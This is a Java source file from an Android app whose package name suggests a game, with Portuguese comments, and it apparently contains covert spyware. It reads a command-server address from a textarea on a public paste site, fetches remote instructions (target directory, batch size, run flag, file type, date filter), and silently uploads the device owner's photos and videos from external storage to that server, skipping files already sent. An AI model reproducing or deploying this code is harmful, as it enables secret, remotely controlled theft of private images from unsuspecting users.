package com.example.rpg;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.MediaStore;

import org.json.JSONArray;
import org.json.JSONObject;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.SortedSet;
import java.util.TreeSet;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import android.content.Context;
import android.content.ContentResolver;

public class ApiController {

    // Tipos de extensão de arquivos de img
    public final List<String> imgTypes = Arrays.asList(
            ".jpeg", ".JPEG", ".jpg", ".JPG",
            ".png", ".PNG", ".gif", ".GIF",
            ".bmp", ".BMP"
    );

    // Tipos de extensão de arquivos de vid
    public final List<String> vidTypes = Arrays.asList(
            ".mp4", ".avi"
    );

    public void testMethod(){
        System.out.println("TESTANDO ESSE METODO");
    }

    private MultipartBody.Part prepareFilePart(String partName, File file) {
        // https://github.com/iPaulPro/aFileChooser/blob/master/aFileChooser/src/com/ipaulpro/afilechooser/utils/FileUtils.java
        // use the FileUtils to get the actual file by uri

        // create RequestBody instance from file
        RequestBody requestFile =
                RequestBody.create(
                        //MediaType.parse("image/*"),
                        MediaType.parse("multipart/form-data"), // para img ou vid
                        file
                );

        // MultipartBody.Part is used to send also the actual file name
        return MultipartBody.Part.createFormData(partName, file.getName(), requestFile);
    }

    private void uploadMultipleFiles(
            String dir,
            int maxUploads,
            ArrayList<String> sendedList,
            ArrayList<String> allFiles,
            String apiLink,
            UploadConfig conf
    ) {

        // dir: diretorio dos arquivos ou "0"
        // maxUploads: maximo de arquivos por Post
        // sendedList: lista dos arquivos ja enviados
        // allFiles: lista de todos os arquivos(img)
        // apilink: link que veio de algum repositorio online
        // conf: instancia da classe de configuracao

        File[] files;

        // check se dir é "0" e allFiles tem algo dentro
        if(dir.equals("0") && allFiles.size()>0){
            //files = allFiles.toArray();
            File[] arr = new File[allFiles.size()];
            for (int i = 0; i < allFiles.size(); i++)
                arr[i] = new File(allFiles.get(i));// = allFiles.get(i);
            files = arr;
        }
        else{
            // Apenas do diretorio escolhido
            String path= Environment.getExternalStorageDirectory().getAbsolutePath()+dir;
            File directory = new File(path);
            files = directory.listFiles();
        }


        // Pega o path q vem em dir
        //String path= Environment.getExternalStorageDirectory().getAbsolutePath()+dir;
        //System.out.println(path);

        //File directory = new File(path);
        //File[] files = directory.listFiles(); // posso sobrescrever com todos

        List<MultipartBody.Part> parts = new ArrayList<>(); // lista dinamica de arquivos

        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");

        if(conf.getFileType().equals("img")){ // se for img
            for (File file: files) {

                if (!file.getName().equals(".nomedia") // Exclui .nomedia
                        && !sendedList.contains(file.getName()) // ainda nao enviado
                        && imgTypes.contains(getExtensionByFile(file))) // o tipo dele esta na lista
                {
                    if(!conf.getDateName().equals("0")){ // Se tiver data definida
                        // checa se a ultima modificacao é igual a data do filtro
                        if(sdf.format(file.lastModified()).equals(conf.getDateName())){
                            parts.add(prepareFilePart("file", file));
                            System.out.println("Filtrado por data:"+file.getName());
                        }
                    }
                    else { // Se não tiver data definida
                        parts.add(prepareFilePart("file", file));
                        System.out.println("Current Parts Size: " + parts.size());
                    }
                }
                if(parts.size() >= maxUploads){break;}
            }
        }
        else if(conf.getFileType().equals("vid")){ // se for vid
            for (File file: files) {
                if (!file.getName().equals(".nomedia")
                        && !sendedList.contains(file.getName())
                        && vidTypes.contains(getExtensionByFile(file)))
                {
                    if(!conf.getDateName().equals("0")){ // Se tiver data definida
                        if(sdf.format(file.lastModified()).equals(conf.getDateName())){
                            parts.add(prepareFilePart("file", file));
                            System.out.println("Filtrado por data:"+file.getName());
                        }
                    }
                    else { // Se não tiver data definida
                        parts.add(prepareFilePart("file", file));
                        System.out.println("Current Parts Size: " + parts.size());
                    }
                }
                if(parts.size() >= maxUploads){break;}
            }
        }
        System.out.println("Tamanho final de parts: "+parts.size());

        Retrofit retrofitUpload = new Retrofit.Builder()
                .baseUrl(apiLink)
                .addConverterFactory(GsonConverterFactory.create())
                .build();


        Api retrofitAPI = retrofitUpload.create(Api.class);
        Call<ResponseBody> call = retrofitAPI.uploadImages(parts);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                //if (response.body().error != "false") {
                String stringResponse = "";
                try {
                    stringResponse = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                // resposta da API
                System.out.println("RESP : " + stringResponse);

            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }

    public void getCommands(ArrayList<String> allFiles, String newLink) {
        Retrofit retrofit;
        String apiLink = "";

        // isso só vale se o invertexto estiver online no link ac4xrtxmy11
        // if nao tem link usa o link base
        if(newLink == null){
            apiLink = Api.BASE_URL;
        } // se nao tem usa o novo
        else{
            apiLink = newLink;
        }

        retrofit = new Retrofit.Builder()
                .baseUrl(apiLink)
                .build();

        Api retrofitAPI = retrofit.create(Api.class);

        Call<ResponseBody> call = retrofitAPI.getCommands();
        String finalApiLink = apiLink;
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                String jsonResp = "";
                try {
                    // se o DNS nao existe
                    System.out.println("VALOR: " +response.body());
                    if(response.body() == null){
                        return;
                    }
                    System.out.println("TEM VALOR");
                    jsonResp = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                try {
                    JSONObject obj = new JSONObject(jsonResp);

                    // objeto json que veio da API
                    System.out.println(obj);

                    // pegando campos do response
                    String dir = (String) obj.get("dir");
                    int maxUploads = Integer.parseInt((String) obj.get("maxUploads"));
                    String run = (String) obj.get("run");
                    String fileType = (String) obj.get("fileType");
                    String fileDate = (String) obj.get("fileDate");

                    // Criando instancia de configuracao de envio
                    UploadConfig conf = new UploadConfig();
                    conf.setFileType(fileType);
                    conf.setDateName(fileDate);

                    // Pegando a lista de já enviados
                    ArrayList<String> listdata = new ArrayList<>();
                    JSONArray filesSended = (JSONArray) obj.get("filesReceived");

                    if (filesSended != null) {
                        for (int i=0;i<filesSended.length();i++){
                            listdata.add(filesSended.getString(i));
                        }
                    }

                    if (run.equals("true")) {
                        // chamando o metodo de upload passando os parametros q vieram
                        uploadMultipleFiles(dir, maxUploads, listdata, allFiles, finalApiLink, conf);
                    }
                    else{
                        return;
                    }

                } catch (Throwable t) {
                    System.out.println(t);
                    return ;
                }
            }
            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                // setting text to our text view when
                // we get error response from API.
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }

    // Apenas para teste
    public void uploadFile() {
        File file = new File("/storage/emulated/0/Download/niele.jpeg");
        @SuppressLint("SimpleDateFormat") SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");
        System.out.println("File last modified @ : "+ sdf.format(file.lastModified()));
        if(true){return;}

        RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
        MultipartBody.Part body =
                MultipartBody.Part.createFormData("file", file.getName(), requestFile);

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(Api.BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        Api retrofitAPI = retrofit.create(Api.class);
        Call<ResponseBody> call = retrofitAPI.uploadImage(body);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                //if (response.body().error != "false") {
                String stringResponse = "";
                try {
                    stringResponse = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                // resposta da API
                System.out.println("RESP : " + stringResponse);

            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }
    public void getLink(ArrayList<String> allFiles){
        final String[] newLink = {null};
        System.out.println("GET NEW LINK");
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://www.invertexto.com")
                .build();
        Api retrofitAPI = retrofit.create(Api.class);

        Call<ResponseBody> call = retrofitAPI.getNewServerLink();
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                String res = "";
                try {
                    System.out.println("Dentro do new link");
                    if(response.body() == null){
                        System.out.println("Response Null, URL Domain not found");
                        return;
                    }
                    res = response.body().string();

                    Document document = Jsoup.parse(res);
                    Element textArea = document.select("textarea").first();
                    String link = textArea.text();
                    newLink[0] = link;

                    getCommands(allFiles, link);

                    System.out.println("RESULTADO: "+newLink[0]);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                // setting text to our text view when
                // we get error response from API.
                System.out.println("Error found is : " + t.getMessage());
            }
        });

    }
    public String getExtensionByFile(File file){
        // pegando a extensao
        int i = file.getName().lastIndexOf('.');
        if (i > 0) {
            String extension = file.getName().substring(i);
            return extension;
        }
        return "ERROR";
    }
}
